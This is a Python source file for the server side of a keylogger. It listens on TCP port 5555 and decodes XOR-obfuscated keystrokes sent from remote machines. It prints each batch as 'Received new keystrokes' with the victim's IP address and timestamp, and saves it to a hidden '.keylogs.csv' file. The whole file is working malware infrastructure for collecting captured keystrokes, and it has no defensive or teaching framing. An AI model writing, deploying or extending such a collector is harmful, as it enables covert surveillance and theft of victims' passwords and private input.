#!/usr/bin/env python3

from os import getenv
from socketserver import *
from select import select
from threading import Thread, current_thread
from pwn import xor
import logging
import threading
from datetime import datetime

import socket
import pandas as pd
import time


def log_csv(ip_cli, ipt):
    if not ip_cli:
        return
    df = pd.DataFrame({ip_cli: [ipt]})
    try:
        old_df = pd.read_csv(".keylogs.csv").fillna(0)
        df = pd.concat([df, old_df]).fillna(0)
    except FileNotFoundError:
        open(".keylogs.csv", "w+").close()
    finally:
        df.to_csv(".keylogs.csv")


class TCPHandler(BaseRequestHandler):

    def handle(self):
        Red='\033[31m'          # Red
        Green='\033[32m'        # Green
        Yellow='\033[33m'       # Yellow
        Blue='\033[34m'         # Blue
        Cyan='\033[36m'         # Cyan
        NC="\033[m"               # Color Reset 

        client = self.request.getpeername()
        ip_cli = f'{client[0]}:{client[1]}'
        log_csv(ip_cli, "200 NEW CONNEXION")
        while True:
            try:
                data = self.request.recv(1024)
            except (ConnectionResetError, BrokenPipeError):
                print(f'{ip_cli}: disconnected. Bye!')
                log_csv(ip_cli, '500 KO')
                return
            if not data:
                continue
            #  Decode data here, before writing it into csv.
            data = str(xor(data, 'B4N4N4'), 'ascii')
            cur_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            print(f'{Green}[+] {Red}{cur_time}{NC}: Received new keystrokes from {Red}{ip_cli}{NC}:{Cyan} {data}{NC}')
            log_csv(ip_cli, f'{data}\n{cur_time}')


class Server(ThreadingMixIn, TCPServer):
    daemon_threads = True
    allow_reuse_address = True
    poll_interval = 0.5


if __name__ == '__main__':
    HOST = ''
    PORT = 5555

    with Server((HOST, PORT), TCPHandler) as server:
        ip, port = server.server_address
        server_thread = Thread(target=server.serve_forever)
        server_thread.start()

        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()
